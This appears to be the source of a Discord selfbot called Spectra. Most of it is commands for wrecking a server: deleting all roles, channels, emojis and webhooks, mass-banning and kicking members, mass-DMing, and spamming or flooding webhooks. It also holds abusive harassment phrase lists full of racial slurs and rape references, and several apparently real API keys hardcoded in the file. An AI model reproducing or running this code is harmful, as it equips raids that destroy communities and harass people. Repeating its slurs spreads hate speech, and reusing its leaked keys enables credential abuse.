            await asyncio.sleep(0.2)
        await ctx.send("Roles created.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def deleteroles(ctx):
    await ctx.send("Deleting all roles...")
    try:
        for role in ctx.guild.roles:
            if role != ctx.guild.default_role:
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except: pass
        await ctx.send("Roles wiped.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def deletechannels(ctx):
    await ctx.send("Deleting all channels...")
    try:
        for ch in ctx.guild.channels:
            try:
                await ch.delete()
                await asyncio.sleep(0.2)
            except: pass
        await ctx.send("Channels deleted.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def deletemojis(ctx):
    await ctx.send("Deleting all emojis...")
    try:
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                await asyncio.sleep(0.2)
            except: pass
        await ctx.send(" Emojis wiped.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def deletewebhooks(ctx):
    await ctx.send(" Deleting all webhooks...")
    try:
        for channel in ctx.guild.text_channels:
            try:
                hooks = await channel.webhooks()
                for hook in hooks:
                    await hook.delete()
                    await asyncio.sleep(0.1)
            except: pass
        await ctx.send(" webhook(s) gone.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def massban(ctx):
    await ctx.send(" banning all users...")
    try:
        for member in ctx.guild.members:
            try:
                await member.ban(reason="fuck you nigga join https://discord.gg/taS5TaryCy")
                await asyncio.sleep(0.3)
            except: pass
        await ctx.send("mass ban finished.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def masskick(ctx):
    await ctx.send("kicking everyone")
    try:
        for member in ctx.guild.members:
            try:
                await member.kick(reason="no mercy https://discord.gg/taS5TaryCy")
                await asyncio.sleep(0.3)
            except: pass
        await ctx.send("everyone kicked.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def dmall(ctx, *, msg):
    await ctx.send("spectra is now dming everyone in the server WARNING: THIS CAN GET YOUR ACCOUNT LOCKED")
    try:
        for member in ctx.guild.members:
            if not member.bot:
                try:
                    await member.send(msg)
                    await asyncio.sleep(1)
                except: pass
        await ctx.send("DMs sent.")
    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def ddos(ctx, ip):
    await ctx.send(f"launching DDoS attack on this dirty african `{ip}`...")
    for _ in range(5):
        await asyncio.sleep(1)
        await ctx.send(f"sending packets to `{ip}`...")
    await ctx.send("system overwhelmed... target **down**")

import asyncio
from datetime import datetime

@bot.command()
async def killselfbot(ctx):
    await ctx.send("Spectra is shutting down...")

    with open("restart_log.txt", "a") as f:
        f.write(f"[{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC] Spectra manually shut down by {ctx.author}\n")

    await asyncio.sleep(2)  
    await bot.close()


@bot.command()
async def stealemoji(ctx, url):
    try:
        name = f"emoji{random.randint(1000,9999)}"
        img_data = requests.get(url).content
        emoji = await ctx.guild.create_custom_emoji(name=name, image=img_data)
        await ctx.send(f"spectra has now stolen the emoji: <:{emoji.name}:{emoji.id}>")
    except Exception as e:
        await ctx.send(f"{e}")

@bot.command()
async def massleave(ctx):
    await ctx.send("Leaving all severs if u wanna stop this just close the bot or whatever your hosting it on...")
    try:
        for guild in bot.guilds:
            await guild.leave()
            await asyncio.sleep(0.5)
        await ctx.send("spectra has left all servers.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def slots(ctx):
    symbols = ["🍒", "🍋", "🔔", "⭐", "🍇", "💎"]
    result = [random.choice(symbols) for _ in range(3)]
    await ctx.send(f"🎰 {' | '.join(result)}")
    if len(set(result)) == 1:
        await ctx.send("you win good job!")
    else:
        await ctx.send("no match try again twin.")

@bot.command()
async def rps(ctx, choice):
    options = ["rock", "paper", "scissors"]
    bot_choice = random.choice(options)
    result = ""
    if choice == bot_choice:
        result = "It's a tie!"
    elif (choice == "rock" and bot_choice == "scissors") or \
         (choice == "scissors" and bot_choice == "paper") or \
         (choice == "paper" and bot_choice == "rock"):
        result = "You win (i let you win)"
    else:
        result = "you lost haha"
    await ctx.send(f"🪨🧻✂️ You chose `{choice}`, I chose `{bot_choice}` — {result}")

@bot.command()
async def _8ball(ctx, *, question):
    responses = [
        "Yes", "No", "Maybe", "Ask again later", "Definitely", "100%", "Not likely", "Try again", "Doubt it", "hell no"
    ]
    await ctx.send(f"🎱 {random.choice(responses)}")

@bot.command()
async def gayrate(ctx, user: discord.User):
    percent = random.randint(0, 100)
    await ctx.send(f"{user.mention} is **{percent}%** gay.")

@bot.command()
async def simprate(ctx, user: discord.User):
    percent = random.randint(0, 100)
    await ctx.send(f"{user.mention} is **{percent}%** simp.")

@bot.command()
async def ppsize(ctx, user: discord.User):
    length = random.randint(0, 15)
    bar = "8" + "=" * length + "D"
    await ctx.send(f"{user.mention}'s PP size:\n`{bar}`")

@bot.command()
async def namehistory(ctx, user: discord.User):
    await ctx.send(f"past names of {user.name} not available via user token — WIP")

@bot.command()
async def badgegrab(ctx, user: discord.User):
    flags = user.public_flags
    badges = []
    if flags.staff: badges.append("Staff")
    if flags.partner: badges.append("Partner")
    if flags.hypesquad_balance: badges.append("Balance")
    if flags.hypesquad_bravery: badges.append("Bravery")
    if flags.hypesquad_brilliance: badges.append("Brilliance")
    if flags.verified_bot_developer: badges.append("Dev")
    if flags.bug_hunter: badges.append("Bug Hunter")
    if not badges: badges.append("None")
    await ctx.send(f"badges for {user.name}: {' | '.join(badges)}")

@bot.command()
async def accountage(ctx):
    created = bot.user.created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    await ctx.send(f"account created on: `{created}`")


import requests
from io import BytesIO

@bot.command()
async def resetpfp(ctx):
    await bot.user.edit(avatar=None)
    await ctx.send("selfbot profile picture reset.")

@bot.command()
async def resetbio(ctx):
    headers = {"Authorization": token}
    json = {"bio": ""}
    try:
        requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json=json)
        await ctx.send("bio is now reset.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def setbio(ctx, *, text):
    headers = {"Authorization": token}
    json = {"bio": text}
    try:
        requests.patch("https://discord.com/api/v9/users/@me", headers=headers, json=json)
        await ctx.send(f"bio is now set to: `{text}`")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def setpfp(ctx, url):
    try:
        img_data = requests.get(url).content
        await bot.user.edit(avatar=img_data)
        await ctx.send("profile picture updated.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def setbanner(ctx, url):
    await ctx.send("setting banner is getting worked on.")

@bot.command()
async def nick(ctx, *, name):
    try:
        await ctx.author.edit(nick=name)
        await ctx.send(f"Nickname changed to: **{name}**")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def rickroll(ctx, user: discord.User):
    await ctx.send(f"{user.mention} yes im cool asf but check ts out https://youtu.be/dQw4w9WgXcQ")

@bot.command()
async def fakeban(ctx, user: discord.User):
    await ctx.send(f"**BANNED**\n"
                   f"User **{user}** has been permanently banned for violating Discord TOS.\n"
                   f"Reason: Ra⁣pe threats, Cu⁣ck, and worst of all hes a fu⁣ck⁣in⁣g ind⁣i⁣an.")

@bot.command()
async def trollping(ctx, user: discord.User):
    for _ in range(5):
        await ctx.send(f"{user.mention} 🤡")
        await asyncio.sleep(0.5)

@bot.command()
async def ip(ctx, user: discord.User):
    fake_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    await ctx.send(f"IP found for {user.name}: `{fake_ip}`")

@bot.command()
async def hacked(ctx, user: discord.User):
    await ctx.send(f"💀 {user.name} has been **HACKED** and ra⁣ped...\nInjecting backdoor with tyrone...\nPraying to the i⁣ndi⁣an cow god...\nUploading token to webhook...")
    await asyncio.sleep(3)
    await ctx.send("sucefully hacked currylover459")

import os
import sys
import asyncio
import random
import subprocess
from discord.ext import commands
from win10toast import ToastNotifier
from datetime import datetime

restarting = False

@bot.check
async def block_if_restarting(ctx):
    return not restarting

@bot.command()
async def restart(ctx):
    global restarting
    restarting = True

    delay = random.randint(2, 5)
    await ctx.send(f"Restarting in {delay} seconds...")
    
    with open("restart_log.txt", "a") as f:
        f.write(f"[{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC] Restarted by {ctx.author}\n")

    await asyncio.sleep(delay)

    subprocess.Popen([
        sys.executable, "-c",
        "from win10toast import ToastNotifier; "
        "ToastNotifier().show_toast('Spectra Selfbot', 'Restart Successful', duration=5)"
    ])

    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.command()
async def whois(ctx, user: discord.User):
    await ctx.send(f"SPECTRA User Info\n"
               f"Username: {user}\n"
               f"ID: {user.id}\n"
               f"Created: {user.created_at.strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
               f"Avatar URL: {user.avatar_url}")


@bot.command()
async def serverinfo(ctx):
        await ctx.send(f"SPECTRA Server Info\n"
               f"Name: {ctx.guild.name}\n"
               f"ID: {ctx.guild.id}\n"
               f"Owner: {ctx.guild.owner}\n"
               f"Members: {ctx.guild.member_count}\n"
               f"Icon URL: {ctx.guild.icon_url}")

@bot.command()
async def userinfo(ctx, user: discord.Member):
    roles = [r.name for r in getattr(user, 'roles', []) if r.name != "@everyone"]
    
    message = (f"🧑 **User Info**\n"
               f"Username: {user}\n"
               f"ID: {user.id}\n"
               f"Created At: {user.created_at.strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
    
    if roles:
        message += f"Roles: {', '.join(roles)}"

    await ctx.send(message)


import discord
from discord.ext import commands

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    try:
        await member.ban(reason=reason)
        await ctx.send(f"✅ {member} has been banned. Reason: {reason or 'No reason provided.'}")
    except Exception as e:
        await ctx.send(f"❌ Failed to ban {member}. Error: {e}")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    try:
        await member.kick(reason=reason)
        await ctx.send(f"✅ {member} has been kicked. Reason: {reason or 'No reason provided.'}")
    except Exception as e:
        await ctx.send(f"❌ Failed to kick {member}. Error: {e}")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def warn(ctx, member: discord.Member, *, reason=None):
    await ctx.send(f"⚠️ {member.mention} has been warned. Reason: {reason or 'No reason provided.'}")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, member: discord.Member, *, reason=None):
    guild = ctx.guild
    muted_role = discord.utils.get(guild.roles, name="Muted")

    if not muted_role:
        try:
            muted_role = await guild.create_role(name="Muted", reason="Create Muted role for muting members")
            for channel in guild.channels:
                await channel.set_permissions(muted_role,
                                              speak=False,
                                              send_messages=False,
                                              read_message_history=True,
                                              read_messages=True)
            await ctx.send("🔈 'Muted' role created and permissions set.")
        except Exception as e:
            return await ctx.send(f"❌ Failed to create Muted role. Error: {e}")

    if muted_role in member.roles:
        return await ctx.send(f"⚠️ {member.mention} is already muted.")

    try:
        await member.add_roles(muted_role, reason=reason)
        await ctx.send(f"🔇 {member.mention} has been muted. Reason: {reason or 'No reason provided.'}")
    except Exception as e:
        await ctx.send(f"❌ Failed to mute {member}. Error: {e}")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muted_role:
        return await ctx.send("❌ No 'Muted' role found.")

    if muted_role not in member.roles:
        return await ctx.send(f"⚠️ {member.mention} is not muted.")

    try:
        await member.remove_roles(muted_role, reason="Unmuted by command")
        await ctx.send(f"🔊 {member.mention} has been unmuted.")
    except Exception as e:
        await ctx.send(f"❌ Failed to unmute {member}. Error: {e}")

@bot.command()
async def whspam(ctx, url, *, msg):
    await ctx.send(f"spectra is now spamming the webhook with: `{msg}`")
    try:
        for _ in range(20):
            async with aiohttp.ClientSession() as session:
                await session.post(url, json={"content": msg})
            await asyncio.sleep(0.3)
        await ctx.send("spectra webhook spam done xd.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whdelete(ctx, url):
    try:
        async with aiohttp.ClientSession() as session:
            await session.delete(url)
        await ctx.send("webhook deleted.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whnuke(ctx, url, *, msg):
    await ctx.send(f"spectra is now nuking the webhook with `{msg}`shoutout alex heh...")
    try:
        for _ in range(50):
            async with aiohttp.ClientSession() as session:
                await session.post(url, json={"content": msg})
            await asyncio.sleep(0.1)
        await ctx.send("webhook nuked.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whflood(ctx, url):
    await ctx.send("webhook flooding is now started.")
    try:
        while True:
            async with aiohttp.ClientSession() as session:
                await session.post(url, json={"content": "spectra runs me!! 💦"})
            await asyncio.sleep(0.1)
    except:
        pass

@bot.command()
async def whhook(ctx, name, *, msg):
    embed = discord.Embed(title=name, description=msg, color=0x00ffcc)
    async with aiohttp.ClientSession() as session:
        await session.post("YOUR_WEBHOOK_HERE", json={
            "username": name,
            "embeds": [embed.to_dict()]
        })


@bot.command()
async def whrainbow(ctx, url):
    await ctx.send("🌈 Rainbow mode started...")
    colors = ["🔴", "🟠", "🟡", "🟢", "🔵", "🟣"]
    try:
        for _ in range(30):
            async with aiohttp.ClientSession() as session:
                await session.post(url, json={"content": random.choice(colors)})
            await asyncio.sleep(0.2)
        await ctx.send("you are now a true fa⁣gg⁣⁣ot.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whghost(ctx, url):
    try:
        msg = {"content": "@everyone"}
        async with aiohttp.ClientSession() as session:
            response = await session.post(url, json=msg)
            if response.status == 204:
                await ctx.send("spectra ghost pinged webhook.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whupload(ctx, url):
    await ctx.send("uploading files to the webhook don't fold")
    try:
        for _ in range(5):
            async with aiohttp.ClientSession() as session:
                await session.post(url, data={"file": open("payload.txt", "rb")})
            await asyncio.sleep(0.3)
        await ctx.send("spectra has sent the files.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def whspamlist(ctx):
    await ctx.send("Mass spamming from webhook list not yet added.")

@bot.command()
async def whmassdelete(ctx):
    await ctx.send("Mass webhook deletion from list not yet added.")

@bot.command()
async def gcspam(ctx, *, msg):
    for _ in range(20):
        await ctx.send(msg)
        await asyncio.sleep(0.3)

@bot.command()
async def gcrename(ctx):
    try:
        with open("protection.txt", "r", encoding="utf-8") as f:
            names = f.readlines()

        while True:
            for name in names:
                await ctx.channel.edit(name=name.strip())
                await asyncio.sleep(1)
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def gcname(ctx, *, name):
    try:
        await ctx.channel.edit(name=name)
        await ctx.send(f"Group name set to **{name}**")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def gckick(ctx, user: discord.User):
    try:
        await ctx.channel.send(f"/remove {user.id}")
        await ctx.send(f"kicked {user.name} from group.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def gckill(ctx, user: discord.User = None):
    if not isinstance(ctx.channel, discord.GroupChannel):
        return await ctx.send("```This command only works in group chats.```")

    phrases = [
        "fuck you", "your mom disappointed", "go cry", "kys retard",
        "you folded", "sit the fuck down", "ur dad left for a reason",
        "ur sister saw this", "you suck", "you get no wins",
        "raped ur sister irl", "trashcan", "you dropped out", "nobody loves you",
        "get muted loser", "ur gc mine", "ur pathetic", "go back to summer school",
        "ur breath stinks", "go touch grass", "skid based",
        "ur not real", "spectra owns u", "this my gc now", 
        "did you even win?", "get killed by alex", "ur just background noise",
        "your parents regret making you", "ai generated nigga",
        "go apply at mcdonalds", "ur gc dead", "1v1 me and cry",
        "zero bitches", "uninstall discord", "ur ego comedy",
        "you got cooked", "ur not him", "leave before I rename ur mom",
        "raped this nigger ->", "this convo is over", "ur skill issue is genetic",
        "you got replaced", "spectra just rolled you", "you type like a bot",
        "actual L human", "say bye to this gc", "chat died with you in it",
        "step out the gc", "my alt solos you", "I get paid to cook you",
        "ur ai generated", "genuinely below average", "ur family left the gc",
        "reconsider your wifi", "not even ur pc turns on cuz of u", "we muted u irl", "spectra owns you", "alex owns you", "@wissssssssssss killed your family"
    ]

    async def nuke():
        while True:
            base = random.choice(phrases)
            if user:
                name = f"{base} {user.display_name}"
            else:
                name = base
            try:
                await ctx.channel.edit(name=name[:100])
            except:
                pass
            await asyncio.sleep(0.5)

    bot.loop.create_task(nuke())

@bot.command()
async def dmlog(ctx):
    await ctx.send("getting worked on")

@bot.command()
async def dmstop(ctx):
    global dm_tasks
    dm_tasks.clear()
    await ctx.send("dm tasks have now stapped.")

@bot.command()
async def massblock(ctx):
    await ctx.send("blocking all of your friends...")
    try:
        friends = await bot.user.relationships()
        for f in friends:
            try:
                await f.block()
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send("You Blocked all friends.")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

status_task = None

from winotify import Notification, audio

def send_windows_notification(title, msg):
    toast = Notification(
        app_id="Spectra",
        title=title,
        msg=msg,
    )
    toast.set_audio(audio.Default, loop=False)
    toast.show()


@bot.command()
async def play(ctx, *, text):
    await bot.change_presence(activity=discord.Game(name=text))
    await ctx.send(f"set status to playing: **{text}**")
    send_windows_notification("", f"Started Playing {text}")


@bot.command()
async def stream(ctx, *, text):
    activity = discord.Streaming(name=text, url="https://twitch.tv/discord")
    await bot.change_presence(activity=activity)
    await ctx.send(f"set status to streaming: **{text}**")
    send_windows_notification("", f"Started Streaming {text}")


@bot.command()
async def watch(ctx, *, text):
    activity = discord.Activity(type=discord.ActivityType.watching, name=text)
    await bot.change_presence(activity=activity)
    await ctx.send(f"status set to: watching **{text}**")
    send_windows_notification("", f"Started Watching {text}")


@bot.command()
async def listen(ctx, *, text):
    activity = discord.Activity(type=discord.ActivityType.listening, name=text)
    await bot.change_presence(activity=activity)
    await ctx.send(f"spectra status set to: listening to **{text}**")
    send_windows_notification("", f"Started Listening to {text}")

@bot.command()
async def clearstatus(ctx):
    await bot.change_presence(activity=None)
    await ctx.send("presence cleared.")

@bot.command()
async def statuscycle(ctx):
    global status_task
    if status_task:
        await ctx.send("status cycling already running.")
        return

    async def cycle():
        global status_task
        try:
            while True:
                with open("status.txt", "r", encoding="utf-8") as f:
                    for line in f:
                        await bot.change_presence(activity=discord.Game(name=line.strip()))
                        await asyncio.sleep(10)
        except:
            pass

    status_task = bot.loop.create_task(cycle())
    await ctx.send("status cycling started from `status.txt`.")

@bot.command()
async def statusstop(ctx):
    global status_task
    if status_task:
        status_task.cancel()
        status_task = None
        await ctx.send("status cycling is now off")
    else:
        await ctx.send("no status cycling running.")

@bot.command()
async def customstatus(ctx, emoji, *, text):
    try:
        await bot.change_presence(activity=discord.CustomActivity(name=text, emoji=emoji))
        await ctx.send(f"custom status is set to: {emoji} {text}")
    except Exception as e:
        await ctx.send(f"error please contact alex: {e}")

@bot.command()
async def fakegame(ctx, *, text):
    await bot.change_presence(activity=discord.Game(name=text))
    await ctx.send(f"Fake game status set: **{text}**")

@bot.command()
async def richstatus(ctx):
    await ctx.send("Coming Soon.")

# CHAT GPT YOOOOOOOOOO
# import discord
# from discord.ext import commands
# from openai import OpenAI
# 
# client = OpenAI(api_key="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")  # put your key here
# 
# @bot.command()
# async def ask(ctx, *, question):
#     await ctx.message.delete()
#     try:
#         response = client.chat.completions.create(
#             model="gpt-3.5-turbo",
#            messages=[{"role": "user", "content": question}]
#        )
#        answer = response.choices[0].message.content
#        await ctx.send(f"**Q:** {question}\n**A:** {answer}")
#   except Exception as e:
#        await ctx.send("[-] Error getting response.")
#        print(f"[!] OpenAI Error: {e}")

import aiohttp

GOOGLE_API_KEY = "AIzaSyDId_oN6acZT-UMHTfYEZUgIcl4GVn1s6g"
GOOGLE_CSE_ID = "2166875ec165a6c21"
YOUTUBE_API_KEY = "AIzaSyDExCZ2UhM3i5WGs5hNYQmIiwswkxbD-Cs"

@bot.command()
async def google(ctx, *, query):
    search_url = "https://www.googleapis.com/customsearch/v1"
    params = {
        "key": GOOGLE_API_KEY,
        "cx": GOOGLE_CSE_ID,
        "q": query,
        "num": 3
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(search_url, params=params) as resp:
            if resp.status != 200:
                await ctx.send("[-] Error with Google Search API.")
                return
            data = await resp.json()
            items = data.get("items", [])
            if not items:
                await ctx.send("[-] No results found.")
                return
            response_text = "**Top Google Results:**\n"
            for item in items:
                title = item.get("title")
                link = item.get("link")
                snippet = item.get("snippet")
                response_text += f"**{title}**\n{snippet}\n{link}\n\n"
            await ctx.send(response_text)

@bot.command()
async def youtube(ctx, *, query):
    search_url = "https://www.googleapis.com/youtube/v3/search"
    params = {
        "key": YOUTUBE_API_KEY,
        "q": query,
        "part": "snippet",
        "maxResults": 3,
        "type": "video"
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(search_url, params=params) as resp:
            if resp.status != 200:
                await ctx.send("[-] Error with YouTube API.")
                return
            data = await resp.json()
            items = data.get("items", [])
            if not items:
                await ctx.send("[-] No videos found.")
                return
            response_text = "**Top YouTube Videos:**\n"
            for item in items:
                title = item["snippet"]["title"]
                video_id = item["id"]["videoId"]
                url = f"https://youtu.be/{video_id}"
                response_text += f"**{title}**\n{url}\n\n"
            await ctx.send(response_text)

# @bot.command()
# async def banner(ctx, user: discord.User = None):
#    user = user or ctx.author
#    try:
#        # If the user is the bot's own client user, just respond differently
#        if isinstance(user, discord.ClientUser):
#            await ctx.send("I don't have a banner, sorry!")
#            return
#        
#        # For normal users, fetch full user info
#        user = await user.fetch()
#        if user.banner:
#            embed = discord.Embed(title=f"{user}'s Banner")
#            embed.set_image(url=user.banner.url)
#            await ctx.send(embed=embed)
#        else:
#            await ctx.send("This user has no banner.")
#    except Exception as e:
#        await ctx.send(f"Failed to fetch banner: {e}")


@bot.command()
async def alex(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("Mention a user to compare with Alex. Wait. You cant 😂")
        return

    traits = [
    "fucking better than you", "too cool for you", "smarter than your entire family", "got more swag", 
    "too good to care", "more popular than you'll ever be", "outclassing you in every way", "too legendary", 
    "not even trying", "way more talented than your favorite celebrity", "too badass for your taste", 
    "your favorite person's idol", "hard to compete with", "too stylish to be real", "you wish you could be me", 
    "too perfect for words", "showing you how it's done", "taking over the game", "too confident to fail", 
    "way better than you on your best day", "always winning", "on another level", "too intellectual for you", 
    "out of your league", "the definition of perfection", "can't top this", "always the best in the room", 
    "too skilled for your weak ass", "more humble than you'll ever be", "too cool for your lame standards", 
    "the real MVP", "in a league of my own", "more lit than your whole squad", "making you jealous with ease", 
    "too funny for you to keep up", "too sharp for you", "way too clever for your tricks", "better than all your idols", 
    "the standard you can never reach", "far superior", "living rent-free in your head", "untouchable", 
    "too quick-witted to be outsmarted", "born to flex", "making it look easy", "you can't even catch up", 
    "superior to your existence", "the one everyone talks about", "way cooler than your whole crew", 
    "I'm the whole package", "way too stylish for your taste", "too slick for you to understand", "the one that sets trends", 
    "too ambitious to fail", "in a whole different league", "way better than you'll ever be", "too creative for you", 
    "outshining everyone", "the chosen one", "got more charisma than your hero", "way too good to be true", 
    "cooler", "smarter", "funnier", "nicer", "stronger", "more stylish", "more interesting", "more creative", 
    "more talented", "more friendly", "more outgoing", "more adventurous", "more unique", "more fashionable", 
    "more athletic", "more artistic", "more charming", "more organized", "more determined", "more intellectual", 
    "more confident", "more compassionate", "more energetic", "more humble", "more disciplined", "more optimistic", 
    "more positive", "more motivated", "more innovative", "more persistent", "more reliable", "more focused", 
    "more peaceful", "more humorous", "more courageous", "more dynamic", "more ambitious", "more loyal", 
    "more respectful", "more hardworking", "more creative", "more honest", "more skilled", "more thoughtful", 
    "more gentle", "more patient", "more reliable", "more open-minded", "more supportive", "more resourceful", 
    "more mature", "more funny", "more responsible", "more curious", "more bold", "more sincere", "more understanding", 
    "more intelligent", "more knowledgeable", "more caring", "more disciplined", "more approachable", "more trustworthy", 
    "more generous", "more considerate", "more serious", "more mindful", "more passionate", "more strategic", 
    "more reflective", "more energetic", "more outgoing", "more talkative", "more inspiring", "more quick-witted", 
    "more witty", "more playful", "more joyful", "more artistic", "more charming", "more spontaneous", "more independent", 
    "more optimistic", "more adventurous", "more fun-loving", "more sociable", "more charismatic", "more engaging", 
    "more captivating", "more magnetic", "more electrifying", "more dazzling", "more radiant",
    "more lively", "more dynamic", "more enthusiastic", "more spirited", "more zealous", "more passionate",
    "more fiery", "more intense", "more driven", "more ambitious", "more goal-oriented", "more focused",
    "more determined", "more persistent", "more tenacious", "more resilient", "more adaptable", "more flexible",
    "more resourceful", "more innovative", "more creative", "more imaginative", "more visionary", "more forward-thinking",
    "more practical", "more realistic", "more grounded", "more down-to-earth", "more relatable", "more approachable",
    "more friendly", "more sociable", "more outgoing", "more extroverted", "more introverted", "more reserved",
    "more private", "more secretive", "more mysterious", "more enigmatic", "more intriguing", "more captivating",
    "more alluring", "more enchanting", "more bewitching", "more spellbinding", "more mesmerizing", "more hypnotic", "he's blacker  you", "hes fu⁣ck⁣ing better  you. your a worthless sl⁣av⁣e my ni⁣gg⁣a.", "alex owns you. you fu⁣ck⁣ing ni⁣gg⁣er."
    ]

    trait = random.choice(traits)
    percentage = random.randint(1, 100)

    await ctx.send(f"Alex is {percentage}% {trait} than {user.mention}")


@bot.command()
async def jaso(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("Please mention a user to compare with Jaso.")
        return

    traits = ["cooler", "smarter", "funnier", "nicer", "stronger", "more stylish", "more interesting", "more creative", 
    "more talented", "more friendly", "more outgoing", "more adventurous", "more unique", "more fashionable", 
    "more athletic", "more artistic", "more charming", "more organized", "more determined", "more intellectual", 
    "more confident", "more compassionate", "more energetic", "more humble", "more disciplined", "more optimistic", 
    "more positive", "more motivated", "more innovative", "more persistent", "more reliable", "more focused", 
    "more peaceful", "more humorous", "more courageous", "more dynamic", "more ambitious", "more loyal", 
    "more respectful", "more hardworking", "more creative", "more honest", "more skilled", "more thoughtful", 
    "more gentle", "more patient", "more reliable", "more open-minded", "more supportive", "more resourceful", 
    "more mature", "more funny", "more responsible", "more curious", "more bold", "more sincere", "more understanding", 
    "more intelligent", "more knowledgeable", "more caring", "more disciplined", "more approachable", "more trustworthy", 
    "more generous", "more considerate", "more serious", "more mindful", "more passionate", "more strategic"]
    trait = random.choice(traits)
    percentage = random.randint(1, 100)

    await ctx.send(f"Jaso is {percentage}% {trait} than {user.mention}")

@bot.command()
async def vodka(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("Please dont show ts to vodka :skull_crossbones:")
        return

    traits = ["fucking ni⁣gg⁣er"]
    trait = random.choice(traits)

    await ctx.send(f"Vodka is a {trait}")

@bot.command()
async def running(ctx):
    await ctx.send(
        f"You are running Spectra Version {version}\n"
        f"Current Commands : 247\n"
        f"Current Prefix : ,\n"
        f"Current Status : Running\n"
        f"Logged in As : {bot.user}"
    )



import discord
from discord.ext import commands
import aiohttp
import asyncio

async def send_webhook(webhook_url, content=None, username="Spectra Webhook", avatar_url=None, embeds=None):
    payload = {
        "content": content,
        "username": username,
        "avatar_url": avatar_url,
        "embeds": embeds or []
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(webhook_url, json=payload) as response:
            if response.status in [200, 204]:
                print("Webhook sent.")
            else:
                print(f"Failed to send webhook ({response.status})")

@bot.command()
async def webhook(ctx, action=None, channel: discord.TextChannel = None, *, name=None):
    def check(m): return m.author == ctx.author and m.channel == ctx.channel

    if action == "create":
        if channel is None:
            await ctx.send("Usage: `,webhook create #channel <name>`")
            return

        webhook_name = name if name else "Spectra Webhook"

        try:
            webhook = await channel.create_webhook(name=webhook_name)
            await ctx.send(f"Webhook created in {channel.mention} with name: `{webhook.name}`\nURL: {webhook.url}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to create webhooks in that channel.")
        except discord.HTTPException as e:
            await ctx.send(f"Failed to create webhook: {e}")

    elif action == "send":
        await ctx.send("embed or message?")
        try:
            msg_type = await bot.wait_for('message', check=check, timeout=60)
        except asyncio.TimeoutError:
            return await ctx.send("Timed out.")

        mode = msg_type.content.lower()

        if mode == "message":
            await ctx.send("Send the **webhook URL**:")
            webhook_url = (await bot.wait_for('message', check=check, timeout=60)).content

            await ctx.send("Send the **message content**:")
            content = (await bot.wait_for('message', check=check, timeout=60)).content

            await send_webhook(webhook_url=webhook_url, content=content)
            await ctx.send("Webhook message sent.")

        elif mode == "embed":
            embed = discord.Embed()

            await ctx.send("Embeds:\n- author\n- body\n- fields\n- image\n- footer\nType one to begin. Type `done` when finished.")

            while True:
                try:
                    section = await bot.wait_for('message', check=check, timeout=180)
                except asyncio.TimeoutError:
                    return await ctx.send("Timed out.")

                part = section.content.lower()

                if part == "author":
                    await ctx.send("Send author name:")
                    name = (await bot.wait_for('message', check=check, timeout=60)).content

                    await ctx.send("Send author icon URL (or type `none`):")
                    icon = (await bot.wait_for('message', check=check, timeout=60)).content

                    if icon != "none":
                        embed.set_author(name=name, icon_url=icon)
                    else:
                        embed.set_author(name=name)

                elif part == "body":
                    await ctx.send("Send title:")
                    title = (await bot.wait_for('message', check=check, timeout=60)).content

                    await ctx.send("Send description:")
                    desc = (await bot.wait_for('message', check=check, timeout=60)).content

                    await ctx.send("Send sidebar color (hex like #00ffcc):")
                    color = (await bot.wait_for('message', check=check, timeout=60)).content

                    embed.title = title
                    embed.description = desc
                    embed.color = int(color.replace("#", "0x"), 16)

                elif part == "fields":
                    await ctx.send("How many fields do you want to add?")
                    try:
